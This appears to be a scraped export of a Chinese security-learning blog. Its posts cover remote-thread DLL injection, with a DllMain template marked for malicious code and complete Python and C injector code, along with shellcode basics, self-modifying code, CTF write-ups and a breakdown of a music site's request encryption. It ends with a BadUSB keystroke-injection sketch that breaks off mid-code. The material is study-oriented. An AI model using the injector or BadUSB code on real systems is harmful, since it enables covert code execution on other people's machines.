将dll路径字符串写入刚刚分配的目标程序的内存之中 找到目标程序中LoadLibaray的入口地址 创建远程线程，实现最终注入 DllMain函数 跟exe有个main或者WinMain入口函数一样，DLL也有一个入口函数，就是DllMain 函数原型： BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { return TRUE; } hModule参数：指向DLL本身的实例句柄 ul_reason_for_call参数：指明了DLL被调用的原因，可以有以下4个取值： DLL_PROCESS_ATTACH：进程映射 当DLL被进程 &lt;&lt;第一次&gt;&gt; 调用时，导致DllMain函数被调用，同时ul_reason_for_call的值为DLL_PROCESS_ATTACH，如果同一个进程后来再次调用此DLL时，操作系统只会增加DLL的使用次数，不会再用DLL_PROCESS_ATTACH调用DLL的DllMain函数。 DLL_PROCESS_DETACH：进程卸载 当DLL被从进程的地址空间解除映射时，系统调用了它的DllMain，传递的ul_reason_for_call值是DLL_PROCESS_DETACH。 如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。 DLL_THREAD_ATTACH：线程映射 当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值DLL_THREAD_ATTACH调用DLL的DllMain函数。 新创建的线程负责执行这次的DLL的DllMain函数，只有当所有的DLL都处理完这一通知后，系统才允许线程开始执行它的线程函数。 DLL_THREAD_DETACH：线程卸载 如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作。 注意：如果线程的结束是因为系统中的一个线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。 制作DLL 初步编写一个dll去作为payload #include &quot;windows.h&quot; BOOL WINAPI DllMain(HINSTANCE hMoudle,DWORD ul_reason_for_call,LPVOID lpReserved) { switch(ul_reason_for_call) { case DLL_PROCESS_ATTACH: //恶意代码存放 case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return true; } 之所以要在DLL_PROCESS_ATTACH下存放恶意代码，是因为： 一个程序要调用Dll里的函数，首先要先把DLL文件映射到进程的地址空间。要把一个DLL文件映射到进程的地址空间，有两种方法：静态链接和动态链接的LoadLibrary或者LoadLibraryEx。 当一个DLL文件被映射到进程的地址空间时，系统调用该DLL的DllMain函数，传递的ul_reason_for_call参数为DLL_PROCESS_ATTACH，这种调用只会发生在第一次映射时。如果同一个进程后来为已经映射进来的DLL再次调用LoadLibrary或者LoadLibraryEx，操作系统只会增加DLL的使用次数，它不会再用DLL_PROCESS_ATTACH调用DLL的DllMain函数。不同进程用LoadLibrary同一个DLL时，每个进程的第一次映射都会用DLL_PROCESS_ATTACH调用DLL的DllMain函数。 而注入是在DLL初次加载的时候执行操作，因此在DLL编写时，我们要将恶意代码放在DLL_PROCESS_ATTACH条件下去执行。 编译 在release模式下将其编译组建为一个dll文件 调用DLL 制作好DLL文件后，我们要寻找一个可以调用DLL的操作，这里使用了python去帮助实现注入 所需模块： import sys from ctypes import * 注：ctypes是Python的外部函数库。它提供C兼容的数据类型，并允许在DLL或共享库中调用函数 获取句柄 根据原理，想要实现注入，我们要先获得注入进程的句柄，获取进程句柄使用的api是OpenProcess.该函数一共有三个参数 HANDLE WINAPI OpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId ); dwDesiredAccess参数是权限，我们需要获得所有操作的权限，即PROCESS_ALL_ACCESS，查阅后它的常量值为2035711，即1F0FFF bInheritHandle是是否继承句柄，填false就好 dwProcessId是PID，是目标进程的进程标识符 所以OpenProcess函数以及参数编写如下： PROCESS_ALL_ACCESS=0x001F0FFF AimPid =sys.argv[1] handle_aim=kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(AimPid)) 申请内存 根据原理的第二步，我们需要在目标进程中申请一块内存去存放我们的DLL，这就需要两步，第一步是知道DLL的长度，第二步是申请一块这么大的内存，这时我们需要用到函数VirtualAllocEx。 VirtualAllocEx的作用是在指定进程的虚拟空间保留或提交内存区域，除非指定MEM_RESET参数，否则将该内存区域置0。 函数原形： LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); hProcess：句柄 lpAddress：保留页面的内存地址；一般用NULL自动分配 dwSize：分配的大小 flAllocationType：分配方式，因为我们需要分配和提交修改到内存中，所以根据微软官方定义，将值设为MEM_COMMIT | MEM_RESERVE，宏定义即(0x1000|0x2000) flProtect：内存保护方式，可设为可读可写，即PAGE_READWRITE（0x04） 所以构造如下： MEMORY_ALLC=(0x1000|0x2000) PAGE_READWRITE = 0x04 dll_path= sys.argv[2] dll_path_len=len(dll_path) dll_address=kernel32.VirtualAllocEx(handle_aim,0,dll_path_len,MEMORY_ALLC,PAGE_READWRITE) 写入字符串 申请到内存后，我们要将字符串写进去，这时要使用WriteProcessMemory函数 函数原型： BOOL WINAPI WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_ LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_ SIZE_T *lpNumberOfBytesWritten ); 第一个参数代表句柄，为handle_aim. 第二个参数为写入的起始地址，为刚刚申请下来的dll_address. 第三个参数为写入内容，填dll_path. 第四个参数为写入大小，即dll_path_len. 第五个参数为输出参数，该指针可选，不需要可填NULL。使用byref(0)转化为null指针。 所以函数编写如下： null_zero=c_int(0) kernel32.WriteProcessMemory(handle_aim,dll_address,dll_path,dll_path_len,byref(null_zero)) 寻址 要找到loadlibraryA的地址 loadlibrary函数主要作用为载入指定的动态链接库，并将它映射到当前进程使用的地址空间。一旦载入，即可访问库内保存的资源，成功则返回库模块的句柄。想要调用注入的dll，就必须要找到loadlibrary函数的地址 要找到loadlibrary函数，要从kernel32.dll着手，先用GetModuleHandle函数获取kernel32.dll的句柄，再通过GetProcAddress函数寻找loadlibrary函数的地址 HMODULE WINAPI GetModuleHandle( _In_opt_LPCTSTR lpModuleName ); FARPROC GetProcAddress( HMODULE hModule, // DLL模块句柄 LPCSTR lpProcName // 函数名 ) 函数编写如下： handle_kernel32=kernel32.GetModuleHandleA(&quot;kernel32.dll&quot;) Load_address=kernel32.GetProcAddress(handle_kernel32,&quot;LoadLibraryA&quot;) 创建远程线程，触发payload 使用的函数是CreateRemoteThread，该函数参数有7个。 HANDLE WINAPI CreateRemoteThread( _In_ HANDLE hProcess, _In_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_ LPDWORD lpThreadId ); 第一个参数，远程句柄，还是handle_aim. 第二个参数，线程属性，没有特别说明，可填NULL,加载默认属性。Python中用None表示。 第三个参数，栈大小，我们用不到，填写0表示加载默认大小 第四个参数，线程起始时执行的函数地址，即上一步获得的Load_address. 第五个参数，线程起始执行函数的参数，我们要执行的是loadlibraryA(“injected_dll_path”) 所以，这个参数为dll_address 第六个参数，表示线程创建后的操作。我们要让该线程一旦创建便立即执行，需要填0. 最后一个参数，表示接收创建的线程ID。是个double word类型，在ctypes中用c_ulong即可 函数编写如下： thread_id=c_ulong(0) kernel32.CreateRemoteThread(handle_aim,None,0,Load_address,dll_address,0,byref(thread_id)) 使用 运行python，参数输入想要注入的线程PID和DLL的地址，然后回车 不用python的正常注入手段 #include &lt;Windows.h&gt; void Inject(int pID, char* Path) { //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID); //申请一块内存给DLL路径 LPVOID pReturnAddress = VirtualAllocEx(hProcess, NULL, strlen(Path) + 1, MEM_COMMIT, PAGE_READWRITE); //写入路径到上一行代码申请的内存中 WriteProcessMemory(hProcess, pReturnAddress, Path, strlen(Path) + 1, NULL); //获取LoadLibraryA函数的地址 HMODULE hModule = LoadLibrary(L&quot;KERNEL32.DLL&quot;); LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, &quot;LoadLibraryA&quot;); //创建远程线程-并获取线程的句柄 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL); //等待线程事件 WaitForSingleObject(hThread, 2000); //防止内存泄露 CloseHandle(hThread); CloseHandle(hProcess); } int main() { //传dll路径 const char* a = &quot;路径&quot;; //传入进程ID Inject(PID, (char*)a); return 0; } 获取PID 由于进程打开时的PID是随机分配的，所以要实时获取PID，可以通过进程名去获取PID //根据PID去获取句柄 HMODULE GetProcessModuleHandleByName(DWORD pid, LPCSTR ModuleName) { MODULEENTRY32 ModuleInfo; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);//拍摄进程快照，录入信息 if (!hSnapshot) { return 0; } ZeroMemory(&amp;ModuleInfo, sizeof(MODULEENTRY32));//将MODULEENTRY32结构的ModuleInfo数据填充为0 ModuleInfo.dwSize = sizeof(MODULEENTRY32); if (!Module32First(hSnapshot, &amp;ModuleInfo)) { return 0; } do//查找比较进程名，返回句柄 { if (!lstrcmpi(ModuleInfo.szModule, ModuleName)) { CloseHandle(hSnapshot); return ModuleInfo.hModule; } } while (Module32Next(hSnapshot, &amp;ModuleInfo)); CloseHandle(hSnapshot); return 0; } //获取进程PID DWORD GetProcessIDByName(const char* pName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//拍摄一个快照，返回打开的句柄到指定的快照 if (INVALID_HANDLE_VALUE == hSnapshot) {//检测是否成功打开 return NULL; } PROCESSENTRY32 pe = { sizeof(pe) };//创建一个PROCESSENTRY32类型的结构体并获取他的长度 //循环检测进程中每一个模块的进程名，返回进程的PID for (BOOL ret = Process32First(hSnapshot, &amp;pe); ret; ret = Process32Next(hSnapshot, &amp;pe)) { if (strcmp(pe.szExeFile, pName) == 0) { CloseHandle(hSnapshot); return pe.th32ProcessID; } } CloseHandle(hSnapshot); return 0; } PS： DLL要设置权限，不然远程创建线程会失败 ","link":"https://tickertapetimer.github.io/post/ring3注入学习(2)远程线程注入/"},{"title":"逆向讲课","content":"逆向 逆向，属于二进制的一部分，与PWN不同的是，它主要考察对软件的流程的分析，逆向常用于破解软件、游戏，或者是绿化 基本要求 C/C++、Java、汇编 工具 静态调试：IDA 动态调试：x64dbg、ollydbg、gdb 学习 怎么入门 先学习语言，看懂程序是破解程序的首要条件 练习 BUUCTF、CTFWiki、CTFhub、吾爱破解、看雪论坛 博客/笔记 ","link":"https://tickertapetimer.github.io/post/逆向讲课/"},{"title":"奇怪的知识增加了","content":"寻找main函数 如果main函数找不到，反汇编出来一堆sub_xxxxxxxx，可以寻找exit函数，而exit函数的参数，一般是main函数的返回值。 shellcode的结构 获取kernel32基址——TEB查找法 在NT内核系统中，fs寄存器指向TEB结构，TEB+0x30偏移处指向PEB结构，PEB+0x0c偏移处指向PEB_LDR_DATA结构，PEB_LDR_DATA+0x1c偏移处存放着程序加载的动态链接库地址，第一个指向Ntdll.dll，第二个就是kernel32.dll的基地址。 获取API地址 从dll文件中获取API地址步骤如下： 在DLL基址 + 3ch偏移处获取e_lfanew的地址，即可得到PE文件头。 在PE文件头的78h偏移处得到函数导出表的地址。 在导出表的1ch偏移处获取AddressOfFunctions的地址，在导出表的20h偏移处获取AddressOfNames的地址，在导出表的24h偏移处获取AddressOfNameOrdinalse的地址 AddressOfFunctions函数地址数组和AddressOfNames函数名数组通过AddressOfNameOrdinalse一一对应。 ","link":"https://tickertapetimer.github.io/post/奇怪的知识增加了/"},{"title":"SMC技术浅析","content":"前言 之前弄了一道逆向题，在研究的时候发现它使用了一项我没有见过的技术，现在学习了一波，写一下心得 简介 在上一篇的WP里，谈及了一项技术，SMC，即Self Modifying Code，动态代码加密技术，指通过修改代码或数据，阻止别人直接静态分析，然后在动态运行程序时对代码进行解密，达到程序正常运行的效果，而计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。通常来说，SMC使用汇编去写会比较好，因为它涉及更改机器码，但SMC也可以直接通过C、C++来实现。 注意，如果使用VS20XX来实现SMC，需要将禁用优化，开启固定基址，关闭随机基址，关闭数据保护，并且选择release X64去编译 以下的伪代码演示了一种SMC技术的典型应用： IF .运行条件满足 CALL DecryptProc （Address of MyProc）;对某个函数代码解密 ........ CALL MyProc ;调用这个函数 ........ CALL EncryptProc （Address of MyProc）;再对代码进行加密，防止程序被Dump PE文件 在程序中使用SMC最简单的方法就是修改（或加密）整个数据段或代码段，而想要修改段，我们就要了解PE文件结构， Microsoft为它的32位Windows系统设计了一种全新的可执行文件格式，被成为“Portable Executable”，也就是PE格式 位于文件最开始部位的是一个MS-DOS头部和一段DOS stub代码，在PE文件中保留这一部分是为了DOS和Windows系统共存那一段时期设计的，当程序运行在DOS系统时，DOS系统按照DOS可执行文件的格式调用DOS stub代码，一个典型的DOS stub代码就是在控制台上输出一行提示：“This program cannot be run in MS-DOS mode”，当然不同的编译器产生的DOS stub代码也各不相同。曾经有一段时间很流行一种既可以在DOS系统上运行，又可以在Windows上运行的程序，其原理就是人为地替换这段DOS stub代码。紧跟在DOS stub代码之后的就是PE文件的内容了，首先是一个PE文件标志，这个标志有4个字节，也就是“PE/0/0”。这之后紧接着PE文件头（PE Header）和可选头部（Optional Header，也可以理解为这个PE文件的一些选项和参数）,这两个头结构存放PE文件的很多重要信息，比如文件包含的段（Sections）数、时间戳、装入基址和程序入口点等信息。这些之后是所有的段头部，段头部之后跟随着所有的段实体。PE文件的尾部还可能包含其它一些混杂的信息，包括重分配信息、调试符号表信息、行号信息等等，这些信息并不是一个PE文件必须的部分，比如正常发布的Release版本的程序就没有调试符号表信息和行号信息。 （看得眼疼） 简单实现 PE文件的段，是可以新增的，我们可以通过如下代码去新增一个段： #pragma code_seg(&quot;.ddd&quot;) void abc() { cout &lt;&lt; &quot;WIN&quot;; } void d() { ; } #pragma code_seg() #pragma comment(linker, &quot;/SECTION:.ddd,ERW&quot;) 值得注意的是，段必须要设置成可读写的情况，这样我们才能去修改它 在新增了一个段后，我们要想加密它，就得先找到它，即寻址，网上告诉了我们很多寻址操作，但最简单的莫过于直接指针赋值 char* b1 = (char*)abc; char* c1 = (char*)d; int i = 0; for (; b1 &lt; c1; b1++) { i++; } void* a1 = (char*)abc; for (int i = 0; i &lt; 32; i++) { *((BYTE*)a1 + i) ^= key; } 直接指针赋值可以找到它的地址，然后我这里的加密选择的是最简单无脑的异或，当我们异或后再跳转到该函数是，会发生报错 我们可以查看一下为什么会有异常，分别将异或前和异或后的机器码输出出来看看，我们会发现： 机器码发生了变化，这直接导致代码被改变，无法被识别而报错 明白了这个，我们就可以去写一个简单的SMC了 代码 直接上代码： #include&lt;iostream&gt; #include&lt;Windows.h&gt; using namespace std; #pragma code_seg(&quot;.ddd&quot;) void abc() { cout &lt;&lt; &quot;WIN&quot;; } void d() { ; } #pragma code_seg() #pragma comment(linker, &quot;/SECTION:.ddd,ERW&quot;) int main() { int key; cout &lt;&lt; &quot;input you key:&quot; &lt;&lt; endl; cin &gt;&gt; key; char* b1 = (char*)abc; char* c1 = (char*)d; int i = 0; for (; b1 &lt; c1; b1++) { i++; } void* a1 = (char*)abc; for (int i = 0; i &lt; 32; i++) { *((BYTE*)a1 + i) ^= key; } abc(); system(&quot;PAUSE&quot;); } 这个代码编译出来的程序，是还未经加密的，所以直接解密无法运行，我们要手改一下他的机器码，把他的机器码加密一下 打开StudyPE+，查看段地址 然后在winhex中寻找到相应的地址，将机器码改掉，我这里选择的是与0x2D异或，这样，0x2D就是我的key 修改完数据后保存，打开程序，输入key，发现程序正常运行了 整挺好 ","link":"https://tickertapetimer.github.io/post/SMC技术浅析/"},{"title":"【ACTF2020】Splendid_MineCraft【wp】","content":"前言 这道题在做的时候啥都不懂，就嗯调，调着调着发现这题贼有意思，在运行循环的时候，循环后面的汇编代码会改变，进而出现新的代码，后来百度知道这种操作叫SMC，这题的题目也告诉了我们，它和SMC有关，SMC的操作后文再叙 初步调试 用x32dbg打开，发现在输入后，有N段判断，猜想它是通过这些判断去对比flag和你的输入，于是一段一段来 输入字符串长度 先随便输入几个字符 第一个判断是一个位置和0x1A做比较，如果不等于，则直接进入wrong，在ebp-64的位置查看，发现是我输入的字符长度，所以第一个wrong绕过方法为，输入的字符串长度为0x1A，输入了一下，发现过了第一个wrong 输入字符串头尾 第二个判断通过看汇编可以知道，是对字符串的头尾进行比较，查看有没有ACTF{ }把字符串包起来，于是改头尾再输入，过 下划线分隔字符串 第三个判断之前，有三个strtok函数，百度可知该函数作用为检测特定分隔符，检测到后，将字符串用分隔符隔开，在该程序中，分隔符是下划线 运用到三次strtok函数，说明字符串分成了三块，即有两个下划线，而在分隔符后，有一个判断，判断前调用了一个函数，这个函数是重头戏，在进入该函数时可以发现，该函数有一个循环，在这个循环后面我们会发现一些奇怪的汇编代码 这种代码应该是毫无意义的，运行起来应该会报错才对，但是在执行循环的时候我们会发现，这些没有意义的代码在变化，这就是SMC的操作，在代码运行时改变其他代码，达到一个加密的作用，这也是我们难以对其进行静态调试的原因，循环结束后，代码变成了如下这样： WOW！接下来就可以进行下一步了，观察下一步 发现有一个比较，先记着，再往下看，有一个将ebp-10的值传给eax的操作，在那个wrong前面的判断，可以发现wrong判断的正是eax，而在那个比较成立的情况下，edx会自增1，并且会传值给ebp-8，当ebp-8为6时，ebp-10会被赋1，进而eax会置1，绕过wrong，合理猜想，比较是比较字符串，而用来比较的字符串，应该就是flag的第一段，循环一次可以获得第一段flag的一个字符，总共会循环6次，第一段字符应该是六个，为yOu0y*，更改第一段字符再输入，成功绕过 SMC梅开二度 在查看后面的代码时，又发现了一个循环，而且还是一个循环次数相当大的循环，猜想又是一手SMC，查看循环后面紧跟着的代码，发现没啥变化，但是代码里面有将一个地址赋给eax，然后加上偏移量，然后jmp到那个地址的操作，查看那个地址时发现，是那个地址的代码发生了变化，循环结束后进入函数查看 函数较为复杂，但还是可以看出有一个根据地址和偏移量取值的操作，然后在jmp 165185这一行，进入后可以发现有另一个根据地址和偏移量取值的操作，然后两者取得的值进行比较，猜想是偏移量要对的上 再猜想，偏移量是不是根据我输入的值计算出来的，查看取值代码前面，发现有一个异或操作 研究后得出结论，取值的操作为eax+((你输入的flag的第二段字符[i])^(0x83+i))，与eax+i+0x166比较，所以逆运算出第二段字符：knowo3 明文比较第三段 更改第二段字符后，也过了后面的wrong，现在就差一个wrong了，而这个wrong前面的函数是一个strcmp 这个wrong直接白给，strcmp的对比字符串即为flag的第三段 综上 拼接后得flag：ACTF{yOu0y*_knowo3_5mcsM&lt;} 感想 这题，真的调了好久，因为是想要练习动态调试的操作，所以一直在x32dbg和它死磕，不过磕出来了还是很爽的，最后附上调试用时 这好吗，这很好，这题还是很讲武德的 ","link":"https://tickertapetimer.github.io/post/【ACTF2020】Splendid_MineCraft【wp】/"},{"title":"g2uc_writeup","content":"misc 签到 有手就行 扫码支付 扫描二维码，得到字符串“th1s_1s_n0t_password”，binwalk发现有压缩包，直接改后缀解压，有加密，将字符串填入，解压得“flag{what_ls_you_f1ag}” 二次元？二刺螈！ 丢winhex改宽度，看flag docx是个啥 下载下来解压，得到docx文件，改后缀再解压，得到一个加密压缩包，打开原来的docx文档，得到提示6位数，爆破得“flag{lue_1ue_lue}” 万恶的墨水 脚本 import hashlib A = 'flag{vnei357####}' num = '1234567890qwertyuioplkjhgfdsazxcvbnm' B = 'B970BCC47176E5C61C42954CEA34F567'.lower() num1 = list(num) A1 = list(A) def md5(str): m = hashlib.md5() m.update(str.encode(&quot;utf8&quot;)) return m.hexdigest() for i in range(36): A1[12] = num1[i] for j in range(36): A1[13] = num1[j] for q in range(36): A1[14] = num1[q] for p in range(36): A1[15] = num1[p] A = ''.join(A1) if(md5(A) == B): print(A) Crypto Caesar 凯撒密码，移15位解密得flag{d0youknowkaisa} The rail fence cipher 栅栏密码，8位解密得flag{1_hate_math} 遵守社会主义核心价值观 百度社会主义核心价值观编码，解码得flag{i_love_china} web 氪金才能变强 如题，要输入1000及以上的数，但输入后不能点击提交 F12看前端 删除disabled，可以点击，点击后跳转得flag{w0_xi_zhazhaFe1} 这网站真眼熟 burpsuite抓包 闹钟响了 &lt;?php class clock { function __wakeup() { echo &quot;flag{xxx}&quot;; exit(); } } $qqq = new clock(); echo serialize($qqq); ?&gt; 运行得结果O:5:&quot;clock&quot;:0:{} 传参 极限一换一 源码 &lt;?php $flag = &quot;flag{it_is_fun?_yes!}&quot;; $i = &quot;if you give me a flag , i will give you a flag&quot;; echo($i); if (isset($_GET['a'])) { if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 { die($flag); } else print 'No'; } ?&gt; 传参，?a[]=1 RE 会走迷宫吗 拖进IDA 运行exe 导出迷宫，每一行的字符串是倒的，所以将所有字符串倒过来拼接，再划分成10*10，得迷宫 1100000000 0100000000 0110000000 0011001110 0001111010 0000000010 0000001110 0000111000 0000100000 0000111112 路径即为flag flag{4224242444144222332332244444} 一换一 密文还原一下，fk_dwqo^njXkcjWg_l 脚本 import binascii a = 'fk_dwqo^njXkcjWg_l' for i in range(0, 18): b = int(binascii.b2a_hex(a[i]),16) + i print b 转字符串，得flag{vuevsbvowevo} android g2uc_android1 改后缀，解压，搜索图片，得 g2uc_android2 JEB反编译得 arr = ’0x99, 0x93, 0x9E, 0x98, 0x84, 0xA7, 0x90, 0x8D, 0xA0, 206, 140, 0xA0, 0x9A, 0x9E, 140, 0x86, 0x86, 0x86, 130‘ 将arr中的所有元素与0xFF作异或，得flag{Xor_1s_easyyy} ","link":"https://tickertapetimer.github.io/post/g2uc writeup/"},{"title":"CTFd搭建以及后续使用","content":"搭建 首先，如果你要用来给别人打比赛，那你需要一台服务器，如果是自用，那当我没说 安装git sudo apt install git 安装pip (ubuntu20.04只能用python3，所以要安装pip3) sudo apt install python-pip 安装flask sudo pip install Flask 克隆CTFd sudo git clone https://github.com/CTFd/CTFd.git (速度慢的话可以用国内镜像或者换源) 安装CTFd sudo cd /usr/local/CTFd/ sudo pip install -r requirements.txt 启动CTFd sudo pyhton serve.py (Ubuntu20.04用下面) sudo python3 serve.py 优化 打开发现奇慢无比，查看为什么慢，发现有两个CSS文件，引用了国外的资源，导致奇慢无比，优化一手 将fonts.min.css和fonts.dev.css文件中的https://use.fontawesome.com/releases/v5.9.0/css/all.css改成https://cdn.bootcss.com/font-awesome/5.13.0/css/all.css 再将fonts.googleapis.com改成fonts.useso.com OK，毫秒级体验，爽了 ","link":"https://tickertapetimer.github.io/post/CTFd搭建以及后续使用/"},{"title":"竞赛体验","content":"堆 Q:为什么需要动态分配内存 A:无法确定要分配的内存大小 Q:什么时候需要动态分配内存 A:当程序中有比较大的数据块需要使用内存的时候使用 Q:如何动态分配内存 A:用堆 堆栈分配内存方式 栈：简单快捷，缺乏安全检查，局部 堆：全局，有安全检查，速度较慢，依赖安全检查 栈分配函数：alloc 堆分配函数：malloc，realloc，calloc，free chunk数据结构 malloc_chunk 的结构如下 /* This struct declaration is misleading (but accurate and necessary). It declares a &quot;view&quot; into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . next . | chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ bin介绍 bin是一种记录free chunk的链表数据结构。 系统针对不同大小的free chunk，将bin分为了4类： Fast bin; Unsorted bin; Small bin; Large bin。 在glibc中用于记录bin的数据结构有两种，分别如下所示： fastbinsY: 这是一个数组，用于记录所有的fast bins； bins: 这也是一个数组，用于记录除fast bins之外的所有bins。事实上，一共有126个bins，分别是： bin 1 为unsorted bin; bin 2 到63为small bin; bin 64到126为large bin。 ","link":"https://tickertapetimer.github.io/post/竞赛体验-第一次课/"},{"title":"分析网易云加密","content":"开始 请求分析 随便找一首网页端可以直接听的歌，然后播放，F12 找到这个请求，往下拉，找到下面的两个参数 params: PPC3u0BBwOe2dl2ORRYAc7ilTPDKXrcvvF1qqbw0Q+Th5a6Rsh7BlgC1lk7FeA1ve6aku66SF7JVSMI9adTPesXds+XkD4BIF5d16lLSG9ap7wl6qB984jSkaCbAgWW2TST3eoeopbrd1QxTJ3sJGA== encSecKey: 4333070dfa40e1afa8f94156267f379d34d6f900b308a2704aacf9a0c45049029af501d001d1e4ca2e7fca8c3e4b7fb522d3380d09397935aff21df6f9d5f9d0f4957de8c7948d50d216ba9e3cee5ef9154126a8e0bee6399f748d995cf15134dda5a2892087fda8de002fa78988a65911330351ffba605634d36ad0c7a4d3df Ctrl + Shift + F全局搜索参数名字encSecKey，在core_7497e03f013c8250bb52b3160545806b.js这里找到代码 拉函数出来看看 var bVZ7S = window.asrsea(JSON.stringify(i9b), bqN9E([&quot;流泪&quot;, &quot;强&quot;]), bqN9E(Wx4B.md), bqN9E([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])); e9f.data = j9a.cs0x({ params: bVZ7S.encText, encSecKey: bVZ7S.encSecKey }) 可以看到，asrsea函数传入四个参数然后bVZ7S接收，传给params和encSecKey两个参数，下个断点，刷新查看asrsea的参数 确定参数后，转到asrsea函数查看他的源代码 分别分析函数a,b,c,d function a(a) { var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;; for (d = 0; a &gt; d; d += 1) e = Math.random() * b.length, e = Math.floor(e), c += b.charAt(e); return c } a的作用应该是随机生成长度为a的字符串 function b(a, b) { var c = CryptoJS.enc.Utf8.parse(b) , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;) , e = CryptoJS.enc.Utf8.parse(a) , f = CryptoJS.AES.encrypt(e, c, { iv: d, mode: CryptoJS.mode.CBC }); return f.toString() } b的作用应该是对a进行CBC模式的AES加密，然后转字符串 function c(a, b, c) { var d, e; return setMaxDigits(131), d = new RSAKeyPair(b,&quot;&quot;,c), e = encryptedString(d, a) } c应该是对a进行RSA加密 function d(d, e, f, g) { var h = {} , i = a(16); return h.encText = b(d, g), h.encText = b(h.encText, i), h.encSecKey = c(i, e, f), h } ","link":"https://tickertapetimer.github.io/post/分析网易云加密/"},{"title":"基于badusb实现的基础渗透","content":"badusb基础 初识badusb BadUSB攻击是一种利用USB固件中的固有漏洞的攻击，将一个写入了恶意代码的定制USB设备，例如U盘，插入受害者电脑，它会伪装成HID设备（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）进行操作。它由Karsten Nohl 和 Jakob Lell 在2014年BlackHat大会上提出，特点是恶意代码存在于U盘的固件中，杀毒软件无法访问固件区域，也就没有办法查杀这些恶意代码。应对这一攻击最有效的方法就是不要随意插入未知、不受信任的USB设备。 在讲解BadUSB的原理之前要先介绍一下Rubber Ducky 和Teensy,这两种攻击也是利用HID进行攻击，将设备模拟成键盘进行按键操作，但这两个设备的缺点在于需要定制硬件设备，而BadUSB的优点就是它可以使用通用的USB设备来达成攻击。 但值得注意的是，不是所有USB设备都能制作BadUSB。由于需要将恶意代码写入到固件中，我们需要编写固件并烧录到设备中。想要编写固件也就需要掌握USB设备中的芯片的指令规范，然而开发文档只有部分芯片的是开放的，所以实际上能够制作BadUSB的设备有一定的条件。 badusb制作 本次实验使用的开发板是Arduino/Genuino Micro，该开发板的指令与Arduino Leonardo兼容，所以只要使用Arduino Leonardo的指令去编写代码即可 先下载编写程序的开发软件，网址https://www.arduino.cc/en/Main/Software ，下载完成后打开，选择相应的开发板和端口和编程器 然后开始编写代码，先编写相对简单的代码 #include&lt;Keyboard.h&gt; //包含键盘模块头文件 void setup(){ //初始化 Keyboard.begin();//开始键盘通信 delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 delay(500); Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 delay(500); Keyboard.press('r');//按下r键 delay(500); Keyboard.release(KEY_LEFT_GUI);//松掉win键 